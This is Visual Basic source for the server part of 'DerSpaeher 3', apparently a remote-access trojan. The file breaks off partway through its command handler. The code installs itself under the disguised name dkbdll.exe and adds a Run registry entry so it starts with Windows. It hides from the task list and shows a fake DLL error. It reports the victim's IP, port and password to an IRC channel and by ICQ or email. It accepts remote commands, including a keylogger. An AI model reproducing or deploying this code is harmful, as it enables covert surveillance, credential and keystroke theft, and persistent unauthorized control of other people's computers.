VERSION 5.00
Begin VB.Form Fo 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00808000&
   Caption         =   "DerSpaeher 3 - Server - programmed by: PhilippP !"
   ClientHeight    =   4350
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   7605
   FillColor       =   &H00808000&
   ForeColor       =   &H00808000&
   Icon            =   "DerSpaeher3Server.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   4350
   ScaleWidth      =   7605
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox TCP1 
      Height          =   480
      Left            =   840
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   24
      Top             =   3000
      Width           =   1200
   End
   Begin VB.PictureBox PortO 
      Height          =   480
      Left            =   1320
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   25
      Top             =   3960
      Width           =   1200
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   3135
      Left            =   3840
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   4
      Top             =   360
      Width           =   3615
   End
   Begin VB.PictureBox SockPager 
      Height          =   480
      Left            =   960
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   26
      Top             =   3960
      Width           =   1200
   End
   Begin VB.Timer Timer8 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   7080
      Top             =   3960
   End
   Begin VB.Timer Timer7 
      Enabled         =   0   'False
      Interval        =   6000
      Left            =   5280
      Top             =   3960
   End
   Begin VB.Timer Timer6 
      Interval        =   5000
      Left            =   6720
      Top             =   3960
   End
   Begin VB.PictureBox IPScanner 
      Height          =   480
      Left            =   600
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   27
      Top             =   3960
      Width           =   1200
   End
   Begin VB.Timer Timer19 
      Interval        =   3000
      Left            =   3120
      Top             =   3960
   End
   Begin VB.Timer Timer18 
      Enabled         =   0   'False
      Interval        =   200
      Left            =   3480
      Top             =   3960
   End
   Begin VB.TextBox Text9 
      Height          =   525
      Left            =   4440
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   18
      Top             =   840
      Visible         =   0   'False
      Width           =   615
   End
   Begin VB.TextBox Text8 
      Height          =   195
      Left            =   4080
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   17
      Top             =   960
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.Timer Timer11 
      Interval        =   1000
      Left            =   5640
      Top             =   3960
   End
   Begin VB.PictureBox Winsock2 
      Height          =   480
      Left            =   2040
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   28
      Top             =   3960
      Width           =   1200
   End
   Begin VB.Timer Timer13 
      Enabled         =   0   'False
      Interval        =   50000
      Left            =   4920
      Top             =   3960
   End
   Begin VB.PictureBox Winsock1 
      Height          =   480
      Left            =   2400
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   29
      Top             =   3960
      Width           =   1200
   End
   Begin VB.Timer Timer12 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   3840
      Top             =   3960
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   4000
      Left            =   4560
      Top             =   3960
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H00808000&
      Caption         =   "Kill Connection"
      Height          =   495
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   16
      Top             =   240
      Width           =   3615
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   4200
      Top             =   3960
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   75
      Left            =   6000
      Top             =   3960
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   135
      Left            =   5640
      TabIndex        =   14
      Top             =   1320
      Visible         =   0   'False
      Width           =   75
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   12
      Top             =   1080
      Width           =   3615
   End
   Begin VB.TextBox Text7 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   11
      Top             =   3120
      Width           =   3615
   End
   Begin VB.TextBox Text6 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   10
      Top             =   2640
      Width           =   3615
   End
   Begin VB.TextBox Text5 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   9
      Top             =   2160
      Width           =   3615
   End
   Begin VB.TextBox Text4 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   6
      Top             =   1560
      Width           =   3615
   End
   Begin VB.Timer Timer1 
      Left            =   6360
      Top             =   3960
   End
   Begin VB.DirListBox Dir1 
      Height          =   315
      Left            =   6360
      TabIndex        =   5
      Top             =   6000
      Visible         =   0   'False
      Width           =   135
   End
   Begin VB.FileListBox File1 
      Height          =   285
      Left            =   6480
      TabIndex        =   3
      Top             =   6000
      Visible         =   0   'False
      Width           =   105
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   6360
      TabIndex        =   2
      Top             =   6000
      Visible         =   0   'False
      Width           =   270
   End
   Begin VB.TextBox Text2 
      Height          =   195
      Left            =   3360
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   1080
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Action 
      Height          =   195
      Left            =   5760
      Locked          =   -1  'True
      TabIndex        =   0
      Top             =   1320
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.PictureBox TCP2 
      Height          =   480
      Left            =   240
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   30
      Top             =   3960
      Width           =   1200
   End
   Begin VB.PictureBox wskServer 
      Height          =   480
      Left            =   2760
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   31
      Top             =   3960
      Width           =   1200
   End
   Begin VB.PictureBox wskClient 
      Height          =   480
      Left            =   -120
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   32
      Top             =   3960
      Width           =   1200
   End
   Begin VB.PictureBox PortS 
      Height          =   480
      Left            =   1680
      ScaleHeight     =   420
      ScaleWidth      =   1140
      TabIndex        =   33
      Top             =   3960
      Width           =   1200
   End
   Begin VB.PictureBox Image1 
      Height          =   855
      Left            =   5040
      ScaleHeight     =   795
      ScaleWidth      =   915
      TabIndex        =   21
      Top             =   960
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.PictureBox Picture1 
      Height          =   1095
      Left            =   5400
      ScaleHeight     =   1035
      ScaleWidth      =   1035
      TabIndex        =   20
      Top             =   960
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.Label Label4 
      BackColor       =   &H00404000&
      Caption         =   "commands..."
      ForeColor       =   &H00FFFFC0&
      Height          =   315
      Left            =   120
      TabIndex        =   23
      Top             =   3840
      Width           =   7440
   End
   Begin VB.Label Label111 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Data to Host:"
      Height          =   195
      Index           =   1
      Left            =   3840
      TabIndex        =   22
      Top             =   120
      Width           =   945
   End
   Begin VB.Label Label2 
      BackColor       =   &H00C0C000&
      Height          =   195
      Left            =   120
      TabIndex        =   19
      Top             =   4320
      Visible         =   0   'False
      Width           =   720
   End
   Begin VB.Label Label1 
      Caption         =   "Label1"
      Height          =   15
      Left            =   240
      TabIndex        =   15
      Top             =   960
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00404000&
      Caption         =   "no connection"
      ForeColor       =   &H00FFFFC0&
      Height          =   195
      Left            =   120
      TabIndex        =   13
      Top             =   3600
      Width           =   7440
      WordWrap        =   -1  'True
   End
   Begin VB.Label Label2222 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Set Registry"
      ForeColor       =   &H00FFFFC0&
      Height          =   195
      Left            =   120
      TabIndex        =   8
      Top             =   1920
      Width           =   855
   End
   Begin VB.Label Label111 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Get Registry"
      ForeColor       =   &H00FFFFC0&
      Height          =   195
      Index           =   0
      Left            =   120
      TabIndex        =   7
      Top             =   840
      Width           =   870
   End
End
Attribute VB_Name = "Fo"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetTempFileName Lib "kernel32" Alias "GetTempFileNameA" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hFile As Long) As Long
Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
Private Declare Function GetFocus Lib "user32" () As Long
Private Declare Function ChangeDisplaySettings _
Lib "user32" Alias "ChangeDisplaySettingsA" _
(lpDevMode As Any, ByVal dwflags As Long) As Long
Const SRCCOPY = &HCC0020
Const SRCAND = &H8800C6
Const SRCINVERT = &H660046
Const CCHDEVICENAME = 32
Const CCHFORMNAME = 32
Const DM_PELSWIDTH = &H80000
Const DM_PELSHEIGHT = &H100000
Private Type DEVMODE
dmDeviceName As String * CCHDEVICENAME
dmSpecVersion As Integer
dmDriverVersion As Integer
dmSize As Integer
dmDriverExtra As Integer
dmFields As Long
dmOrientation As Integer


dmPaperSize As Integer
dmPaperLength As Integer
dmPaperWidth As Integer
dmScale As Integer
dmCopies As Integer
dmDefaultSource As Integer
dmPrintQuality As Integer
dmColor As Integer
dmDuplex As Integer
dmYResolution As Integer
dmTTOption As Integer
dmCollate As Integer
dmFormName As String * CCHFORMNAME
dmUnusedPadding As Integer
dmBitsPerPel As Integer
dmPelsWidth As Long
dmPelsHeight As Long
dmDisplayFlags As Long
dmDisplayFrequency As Long
End Type
Private n As DEVMODE
Public ZuMir As String



Private Declare Function SetKeyboardState Lib "user32" (kbArray As KeyboardBytes) As Long
Private Declare Function GetKeyboardState Lib "user32" (kbArray As KeyboardBytes) As Long
Public ErsteD As Boolean
Public ZweiteD As Boolean
Dim Response As String, Reply As Integer, DateNow As String
Dim first As String, Second As String, Third As String
Dim Fourth As String, Fifth As String, Sixth As String
Private inco As String
Dim Seventh As String, Eighth As String
Dim CRLF As String
Dim OldText As String
                    
Dim channel As String
Dim CMode
Dim Start As Single, Tmr As Single
Public DKBV As Boolean
Dim Response2 As String, Reply2 As Integer, DateNow2 As String
Dim first2 As String, Second2 As String, Third2 As String
Dim Fourth2 As String, Fifth2 As String, Sixth2 As String
Dim Seventh2 As String, Eighth2 As String
Dim Start2 As Single, Tmr2 As Single
Dim SendingFile As Boolean
Dim AbortFile As Boolean
Public NumAnzahl As Integer
Public AnzahlZ As Integer
Const VK_NUMLOCK = &H90
Dim RecievedFile As String
Public UserInfoSendenJaNein As Boolean
Public ServerPort As Long
Public WasImSystem As Boolean
Dim BeginTransfer As Single
Public ICQUinPfad As String
Public ICQDBPfad As String
Public RenDatei1
Public Buhh
Public ICQHandle As Long
Public NochNicht As String
Public GibtEsDasBildSchonHmm As Boolean
Public DateiAendungen As String
Public Wichtig As Boolean
Const REG_SZ = 1
Public RenDatei2
Public ServerBinaer
Public AufHeight As Long
Public AufWidht As Long
Public NeueDatei1
Public RegG As String
Public DateiErw As String
Public MalSchau As Boolean
Public WindowsCommandVerzeichnis
Private kbArray As KeyboardBytes
Public IrcNotifyOnOff As Boolean
Public NeueDatei2
Public STUpDown As Long
Public IRCN As Boolean
Public KopieDatei1
Public KopieDatei2
Public DateiEmail1
Public DateiEmail2
Public DateiEmail3
Public DateiKKK As Boolean
Public OffLineT As Boolean
Public PassW
Public UptDateiKopiert As Boolean
Public NummerCookie As Integer
Public RegG1
Public RegG2
Public RegG3
Public IPJaoderNein As Boolean
Public BildGespeichert As Boolean
Public DateiUPTSchonWeg As Boolean
Public DateiWoHin
Public OffWOO
Public OFFNAME
Public SERVERWO
Public HinwoderWas As String
Public ICQPad As String
Public DateiData As String
Public VV
Public WertWert As String
Public DateiSchonGeloescht As Boolean
Public WegJaOderNein As Boolean
Public DateiWirdGeradeGesendet As Boolean
Public UnRemove As String
Public DateiJetztTot As Boolean
Public M1 As Boolean
Public M2 As Boolean
Public DSA As Boolean
Public DateiServer1
Public DateiServer2
Public DateiServer3
Public OffDaten
Public DateiServerJaNein
Public DateiServerReg
Public DateiServerPasswort
Public WindowsVerzeichnis
Public MomentaneIPBeimBenachrichtigen As Integer
Public MomentaneIPBeimBenachrichtigenAndere As Integer
Dim a As Integer
Public IPAdresseVomHost
Public IPGesendetJaOderNein As Boolean
Public SchonMalGestartet As Boolean
Public RRRR As String
Public A1 As Boolean
Public A2 As Boolean
Public B1 As Boolean
Public B2 As Boolean
Public B3 As Boolean
Const WM_SYSCOMMAND = &H112&
Const SC_SCREENSAVE = &HF140&
Const SPI_SETKEYBOARDSPEED = 11
Const SPI_SETSCREENSAVEACTIVE = 17
Const SPI_SETDESKWALLPAPER = 20
Const SPIF_SENDWININICHANGE = &H2
Const SPIF_UPDATEINIFILE = &H1
Private Type KeyboardBytes
   kbByte(0 To 255) As Byte
End Type

Private Sub Command2_Click()
On Error GoTo z
Dim dd
dd = MsgBox("Do you realy want to kill the connection?", vbYesNo, "Der Server")
If dd = vbYes Then
AlleBeendenVerbinden
Timer3.Enabled = False
Else
End If

Exit Sub
z:
End Sub



Private Sub Dir1_Change()
On Error Resume Next
File1.Path = Dir1.Path
End Sub

Private Sub Drive1_Change()
On Error GoTo rRrz
Dir1.Path = Drive1.Drive

Exit Sub
rRrz:
TCP2.SendData "no drive"
End Sub
Sub DateiSchonWeg()
On Error GoTo fehLER
Dim dd As Long
dd = FileLen(GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"))
WegJaOderNein = False
Exit Sub
fehLER:
WegJaOderNein = True
End Sub

Sub DateiKopieren()
On Error Resume Next
WindowsVerzeichnis = WindowsDirectory & "\System\"
FileCopy App.EXEName & ".exe", GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw")
Sleep 1000
WertWertSetzen
End Sub
Sub RegFestLegen()
On Error GoTo LeiderNein

Text5.Text = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Text6.Text = GetSetting("DateiServerReg", "DateiServerReg", "DateiServerReg")
Text7.Text = GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw") & " Hi"
aREGSeTzEN "Local"
Exit Sub
LeiderNein:
End Sub

Sub UnsichtbarOderNicht()
On Error GoTo LeiderNein
Dim dd
dd = FileLen("c:\win95\desktop\1234.txt")
Fo.Visible = True
Call Sichtbar_in_TaskListe(True)
Text1.Locked = False
Exit Sub
LeiderNein:
Text1.Locked = True
Fo.Visible = False
Call Sichtbar_in_TaskListe(False)
End Sub

Sub AbIPPP()
On Error Resume Next
MomentaneIPBeimBenachrichtigenAndere = GetSetting("IP", "IP", "AbIP")
MomentaneIPBeimBenachrichtigen = 195
End Sub
Sub WasAnderesMachenAllsUeblich()
UnRevoveAble
End Sub

Private Sub Form_Load()
On Error GoTo WirdDurchDennBenutzerHaendischGestartet
SaveSetting "StartUp", "StartUp", "StartUP", "Yes"
TCP1.Close
CRLF = Chr$(13) & Chr$(10)
CMode = 0

SaveSetting "cc", "cc", "cc", "n"
NochNicht = "Ne"
AuslesenTarnen
AuslesenEMail

If DateiServer1 = "Leer" Then
DateiServer1 = "dkbdll.exe"
Fo.ServerPort = Val(GetSetting("ServerPort", "ServerPort", "ServerPort"))
DateiServer3 = "True"
DateiServerJaNein = "False"
DateiServerReg = "Explore"
OffWOO = WindowsDirectory & "\System\"
OFFNAME = "RegKey.Dat"
SERVERWO = WindowsDirectory & "\System\"
Else
End If
SaveSetting "Unload", "Unload", "Unload", "Ne"
AnzahlZ = 0
Wichtig = False
WindowsVerzeichnis = WindowsDirectory & "\System\"

OffLineT = False
If Command = "Hi" Then
    

    Timer12.Enabled = True
    IPScanner.LocalPort = 2002
    IPScanner.Listen
    If GetSetting("vv", "vv", "vv") = "True" Then
    Call Sichtbar_in_TaskListe(False)
    Fo.Visible = False
    Else
    Call Sichtbar_in_TaskListe(True)
    Fo.Visible = True
    End If
    UeberFluessigeDateiLoeschen
    
        GoTo ErsteSprungMarke
    
Else

    If DateiServer3 = "True" Then
    Call Sichtbar_in_TaskListe(False)
    Fo.Visible = False
    Else
    Call Sichtbar_in_TaskListe(True)
    Fo.Visible = True
    End If
    SaveSetting "offwo", "offwo", "offwo", OffWOO
    SaveSetting "offname", "offname", "offname", OFFNAME
    SaveSetting "serverwo", "serverwo", "serverwo", SERVERWO
    SaveSetting "vv", "vv", "vv", DateiServer3
VAuswerten
WertWertAuswerten
If Fo.IrcNotifyOnOff = False Then
    SaveSetting "IrcNotify", "IrcNotify", "IrcNotify", "OFF"
Else
    SaveSetting "IrcNotify", "IrcNotify", "IrcNotify", "ON"
End If
    SaveSetting "abf", "abf", "abf", Fo.UnRemove
    SaveSetting "IrcNotify", "ServerPort", "ServerPort", Val(Fo.ServerPort)
    SaveSetting "ServerPort", "ServerPort", "ServerPort", Val(Fo.ServerPort)
    SaveSetting "DateiServer1", "DateiServer1", "DateiServer1", DateiServer1
    SaveSetting "DateiErw", "DateiErw", "DateiErw", DateiErw
    SaveSetting "DateiServerReg", "DateiServerReg", "DateiServerReg", DateiServerReg
    SaveSetting "DateiEmail1", "DateiEmail1", "DateiEmail1", DateiEmail1
    SaveSetting "DateiEmail2", "DateiEmail2", "DateiEmail2", DateiEmail2
    SaveSetting "DateiEmail3", "DateiEmail3", "DateiEmail3", DateiEmail3
    SaveSetting "DateiPasswort", "DateiPasswort", "DateiPasswort", DateiServerPasswort
    
        SaveSetting "DS3CurDir", "d", "d", App.Path & "\" & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw")
    If DateiEmail3 = "ICQ" Then
    SaveSetting "ICQorEMAIL", "ICQorEMAIL", "ICQorEMAIL", "ICQ"
    Else
    SaveSetting "ICQorEMAIL", "ICQorEMAIL", "ICQorEMAIL", "EMAIL"
    End If
    
    If DateiServerJaNein = "True" Then
MsgBox "Die erforderliche .DLL-Datei VC10032.DLL wurde nicht gefunden.", vbExclamation, "Fehler beim Starten des Programms"
Else
    End If

        UeberPruefenObServerSchonImSystemIst
        Exit Sub
    End If
ErsteSprungMarke:
If GetSetting("Off", "Off", "Off") = "AUS" Then
Else
Timer3.Enabled = True
End If
AlleBeendenVerbinden
IPJaoderNein = False
IPGesendetJaOderNein = False
SchonMalGestartet = False
M1 = False
M2 = False
A1 = False
A2 = False
B1 = False
B2 = False
B3 = False
AbIPPP
Exit Sub
WirdDurchDennBenutzerHaendischGestartet:
DateiKopieren
Fo.Visible = False
Unload Fo
Exit Sub
End Sub

Sub UeberFluessigeDateiLoeschen()
On Error Resume Next
Kill GetSetting("DS3CurDir", "d", "d")
End Sub
Sub UeberPruefenObServerSchonImSystemIst()
On Error GoTo u
DkbDllImSystem
If WasImSystem = False Then
    DateiKopieren
    RegFestLegen
    SaveSetting "Unload", "Unload", "Unload", "Ja"
    DoEvents
    Timer7.Enabled = True
    Exit Sub
Else
Wichtig = True
SaveSetting "cc", "cc", "cc", "Jetzt"
    SaveSetting "Unload", "Unload", "Unload", "Ja"
    AnzahlZ = 0
    Timer8.Enabled = True
End If

Exit Sub
u:

End Sub
Sub DkbDllImSystem()
On Error GoTo u
Dim rr
rr = FileLen(GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"))
WasImSystem = True
Exit Sub
u:
WasImSystem = False
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
SockPager.Close
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next

SaveSetting "StartUp", "StartUp", "StartUP", "No"
TCP1.Close
If Command = "Pr" Then
SaveSetting "FG", "FG", "FG", "Nein"
Else
End If
Timer3.Enabled = False
TCP2.Close: PortO.Close: PortS.Close
wskServer.Close: wskClient.Close
Dim Form As Form
   For Each Form In Forms
   Set Form = Nothing
Next Form
End Sub
Private Sub IPScanner_Close()
IPScanner.Close
IPScanner.Listen
End Sub

Private Sub IPScanner_ConnectionRequest(ByVal requestID As Long)
If IPScanner.State <> sckClosed Then IPScanner.Close
IPScanner.Accept requestID
End Sub

Private Sub label3_Click()
MsgBox TCP2.RemoteHostIP
End Sub

Private Sub PortO_Close()
PortO.Close
PortS.Close
End Sub

Private Sub PortO_Connect()
On Error Resume Next
PortS.SendData "Connected to: " & PortO.RemoteHost & ",  " & PortO.RemoteHostIP
End Sub

Private Sub PortO_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
If PortO.State <> sckClosed Then PortO.Close
PortO.Accept requestID
End Sub


Private Sub PortO_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim strData As String
PortO.GetData strData, vbString
PortS.SendData strData
End Sub


Private Sub SockPager_SendComplete()
On Error GoTo T
IcqAnHost2

T:
End Sub
Sub IcqAnHost2()
On Error GoTo z
ZuMir = "ZuMir"
SockPager.Close
SockPager.Connect "wwp.mirabilis.com", 80

Exit Sub
z:
End Sub

Private Sub TCP1_Close()
  TCP1.Close
End Sub


Private Sub TCP1_Connect()
SendData "NICK " & Nickname
SendData "USER email " & TCP1.LocalIP & " " & Server & " :username"
End Sub
Sub AddText(textmsg As String)


End Sub
Private Sub TCP1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
  Dim inData As String
  Dim sline As String
  Dim msg As String
  Dim msg2 As String
  Dim x

  TCP1.GetData inData, vbString
  inData = OldText & inData
  x = 0
  If Right$(inData, 2) = CRLF Then x = 1
  If Right$(inData, 1) = Chr$(10) Then x = 1
  If Right$(inData, 1) = Chr$(13) Then x = 1
  If x = 1 Then
    OldText = ""
  Else
    OldText = inData: Exit Sub

  End If
  
again:
  GoSub parsemsg
  If Left$(sline, 6) = "PING :" Then


    AddText "PING? PONG!"

    TCP1.SendData "PONG :" + Right(sline, Len(sline) - 6) + Chr(13) + Chr(10)


    GoTo again
    End If

  If Left$(sline, 5) = "ERROR" Then
    AddText "*** ERROR " & Mid$(sline, InStr(sline, "("))
  End If
  If Left$(sline, Len(Nickname) + 1) = ":" & Nickname Then

    sline = Mid$(sline, InStr(sline, " ") + 1)
    Select Case Left$(sline, InStr(sline, " ") - 1)
      Case "MODE"
        AddText "*** Your mode is now " & Mid$(sline, InStr(sline, ":") + 1)
    End Select
  End If
  If Mid$(sline, InStr(sline, " ") + 1, 7) = "PRIVMSG" Then

    msg = Mid$(sline, InStr(sline, " ") + 9)
    If LCase$(Left$(msg, InStr(msg, " ") - 1)) = LCase$(Nickname) Then

      AddText "--" & Mid$(sline, 2, InStr(sline, "!") - 2) & "-- " & Mid$(msg, InStr(msg, ":") + 1)
    End If
  End If
  Select Case CMode
    Case 0
      If Mid$(sline, InStr(1, sline, " ") + 1, 3) = "001" Then
        Server = Mid$(sline, 2, InStr(sline, " ") - 2)
      End If
      If Left$(sline, Len(Server) + 1) = ":" & Server Then
        sline = Mid$(sline, InStr(2, sline, ":") + 1)
SendData "JOIN " & "#derspaeher": CMode = 1
        channel = msg
        Dim ghj
        If GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "Leer" Or GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort") = "" Then
        ghj = "No Passwort"
        Else
        ghj = GetSetting("DateiPasswort", "DateiPasswort", "DateiPasswort")
        End If
        IRCN = True
        SendData "PRIVMSG " & "#derspaeher" & " :" & "Hi I´m online! DS3 Server at: IP: " & PortO.LocalIP & ", Port: " & TCP2.LocalPort & ", PWD: " & ghj & " -- Have Fun with me!"
        
        AddText sline
        
      End If
    Case 1
      If Left$(sline, Len(Server) + 1) = ":" & Server Then
        msg = Mid$(sline, InStr(sline, " ") + 1)
        Select Case Left$(msg, InStr(msg, " ") - 1)
          Case "332"
            Topic.Text = Mid$(msg, InStr(msg, ":") + 1)
          Case "353"
            msg = Mid$(msg, InStr(msg, ":") + 1)
            Do Until msg = ""
              x = InStr(msg, " ")
              If x <> 0 Then
                msg = Mid$(msg, x + 1)
              Else
                msg = ""
              End If
            Loop
          Case "366"
            CMode = 2
        End Select
      Else
        If Left$(sline, InStr(sline, " ") - 1) = "JOIN" Then
          AddText "*** " & Nickname & " has joined " & channel
        End If
      End If
    Case 2
      If Mid$(sline, InStr(sline, " ") + 1, 7) = "PRIVMSG" Then
        msg = Mid$(sline, InStr(sline, " ") + 9)
        If LCase$(Left$(msg, InStr(msg, " ") - 1)) = LCase$(Nickname) Then
          AddText "--" & Mid$(sline, 2, InStr(sline, "!") - 2) & "-- " & Mid$(msg, InStr(msg, ":") + 1)
        Else
          If Left$(Mid$(msg, InStr(msg, ":") + 1), 1) = Chr$(1) Then
            msg2 = Mid$(msg, InStr(msg, ":") + 9)
            AddText "* " & Mid$(sline, 2, InStr(sline, "!") - 2) & " " & Left$(msg2, Len(msg2) - 1)
          Else
            AddText "<" & Mid$(sline, 2, InStr(sline, "!") - 2) & "> " & Mid$(msg, InStr(msg, ":") + 1)
          End If
        End If
      Else
       
        AddText sline
      End If
  End Select

  GoTo again
Exit Sub

parsemsg:

  If inData = "" Then Exit Sub
  x = InStr(inData, CRLF)
  If x <> 0 Then
    sline = Left$(inData, x - 1)

    If Len(inData) > x + 2 Then
      inData = Mid$(inData, x + 2)
    Else
      inData = ""
    End If
  Else
    x = InStr(inData, Chr$(13))
    If x = 0 Then
      x = InStr(inData, Chr$(10))
    End If
    If x <> 0 Then
      sline = Left$(inData, x - 1)
    Else
      sline = inData
    End If
   
    If Len(inData) > x + 1 Then
      inData = Mid$(inData, x + 1)
    Else
      inData = ""
    End If
  End If
Return

End Sub

Private Sub TCP1_SendComplete()
If IRCN = True Then
TCP1.Close

If GetSetting("ICQorEMAIL", "ICQorEMAIL", "ICQorEMAIL") = "EMAIL" Then
        EMailAnHost
        Else
        ICQanHost
        End If
Else
End If
End Sub

Private Sub TCP2_Close()
PassW = "a"
Timer3.Enabled = False

TCP2.Close: PortO.Close: PortS.Close
If GetSetting("Off", "Off", "Off") = "AUS" Then

Else
Timer3.Enabled = True: Fo.Text1.Text = ""
End If
TCP2.Listen
With wskServer
    .Close
    .Listen
End With
With wskClient
    .Close
    .Listen
End With
Timer1.Interval = 0
IPJaoderNein = False
Label3.Caption = "no connection"
End Sub

Sub AlarmAlarm()
On Error GoTo z
Dim EER
EER = FileLen("c:\win95\desktop\1234.txt")
InDateiProto
Exit Sub
z:
End Sub
Sub InDateiProto()
On Error GoTo z
Open "c:\win95\desktop\1234.txt" For Input As #2
Dim dd As Long
dd = FileLen("c:\win95\desktop\1234.txt")
Text1.Text = Input(dd, 2)
Close #2
Open "c:\win95\desktop\1234.txt" For Output As #1
Text1.Text = Text1.Text & vbCrLf & TCP2.RemoteHostIP
Print #1, Text1.Text
Text1.Text = ""
Close #1
Exit Sub
z:
End Sub


Private Sub TCP2_ConnectionRequest(ByVal requestID As Long)
If TCP2.State <> sckClosed Then TCP2.Close
TCP2.Accept requestID
AlarmAlarm
Label3.Caption = "connected!!! (" & TCP2.RemoteHostIP & ")"
NumOderNicht

End Sub

Sub NumOderNicht()
On Error GoTo z
Dim Tt
Tt = FileLen("c:\win95\desktop\1234.txt")
NumAnzahl = 0
Timer18.Enabled = True
Exit Sub
z:
End Sub
Sub DateiAbbrechen()
Timer5.Enabled = False
On Error Resume Next
With wskServer
    .Close
    .Listen
End With
With wskClient
    .Close
    .Listen
End With
Close #1
Close #2
Close #3
End Sub

Private Sub TCP2_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next


Dim strData As String
TCP2.GetData strData, vbString
Label4.Caption = strData
If Fo.PassW = "OK" Then
If strData = "ChatOpen" Then
Text2.Text = "ChatOpen"
Action.Text = "Chat"
ChatMe
GoTo 20
ElseIf strData = "KeySpy" Then
Action.Text = ""
Text1.Text = ""
Timer3.Enabled = True
Timer4.Enabled = True

GoTo 20
ElseIf strData = "KeySpyAus" Then
Timer3.Enabled = False
Timer4.Enabled = False
Text1.Text = ""
TCP2.SendData "KeySpyAus"
GoTo 20

ElseIf strData = "WieLangeRenntWindows" Then
WieLangeRenntWindows
GoTo 20
ElseIf strData = "WelcherUser" Then
WelcherUser
GoTo 20
ElseIf strData = "URL" Then
Action.Text = "URL"
TCP2.SendData "URL"
GoTo 20
ElseIf strData = "Beep" Then
Beep
TCP2.SendData "Beep"
ElseIf strData = "RenDatei" Then
Action.Text = "RenDatei"
TCP2.SendData "RenOK"
GoTo 20
ElseIf strData = "NeueDatei" Then

